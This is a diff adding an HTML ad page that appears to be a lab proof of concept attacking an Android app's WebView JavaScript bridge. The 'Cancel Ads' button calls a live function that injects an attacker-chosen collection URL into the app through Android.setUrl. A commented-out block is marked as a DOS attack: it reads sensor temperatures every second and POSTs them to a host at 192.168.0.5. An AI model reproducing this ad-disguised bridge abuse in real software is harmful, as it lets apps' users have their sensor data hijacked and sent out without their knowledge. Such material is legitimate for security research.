@@ -1,0 +1,81 @@
+<html>
+	<head>
+		<script>
+		let maliciousUrl = "";
+		let tempToWrite = "";
+		let xhttp = new XMLHttpRequest();
+		
+
+		function getJavaFunction() {
+			/*****************************************/
+			//Change maliciousUrl to the URL of adserver
+			//comment both function calls for non-attack scenario
+			//uncomment injectUrl() for injection attack
+			//uncomment getTemp() and setInterval() for DOS attack 
+			/**************************/
+			maliciousUrl = "http://192.168.0.5:2020/api/CollectedData";
+
+			//comment these 2 function calls for non-attack scenario
+			//uncomment new injectUrl(maliciousUrl) for injection attack
+			new injectUrl(maliciousUrl);
+
+			//uncomment getTemp() for DOS attack
+			//getTemp();
+
+		}
+
+		//Injects malicious URL to Android and calls clearAd()
+		function injectUrl(maliciousUrl) {
+			fakeUrl = maliciousUrl;
+
+			//Set fakeUrl in Android app
+			Android.setUrl(fakeUrl);
+			clearAds();
+		}
+
+		/**************************************************************/
+		//reading temperature from Android in every 1 second using AJAX
+		//uncomment setInterval() and getTemp() for DOS attack
+		/***********************************************************/
+		/*setInterval(function getTemp() {
+			let listOfTemp = Android.getTemperature();
+			tempToWrite = listOfTemp.substring(1, listOfTemp.length-1);
+			//document.getElementById("adsHere").innerHTML = tempToWrite;
+			xhttp.open("POST", "http://192.168.0.5:2020/api/CollectedData" , true);
+			xhttp.setRequestHeader("Content-type", "application/x-www-form-urlencoded");
+			xhttp.send("temperature="+tempToWrite);
+			//xhttp.abort();
+		},1000); */
+
+
+		//clearing the body when ads is cancelled (cancel button pressed)
+		function clearAds() {
+			divValue = document.getElementById("adsBody");
+			divValue.parentNode.removeChild(divValue);
+		}
+		
+		</script>
+
+	</head>
+
+		<body id="adsBody"> 
+
+	
+		<div id="adsHere" style="margin:0; padding:0; height: 0; width: 0;">
+			<p id="adsHere"></p>
+			<p id="toTest"></p>
+			<p style="width:680px; height: 60px; border:2px solid #000;">
+				<span>Ads come here<br/> Ads can be cancelled pressing cancel button</span><br />
+				<a href="http://localhost/metawear-ads/display.php">View collected data</a> 
+				<input type="button" value="Cancel Ads" name="submit" onclick="getJavaFunction()" style="float:right;" /> 
+			</p>
+
+		</div>
+			
+			
+		
+	</body>
+	
+	
+	
+</html>
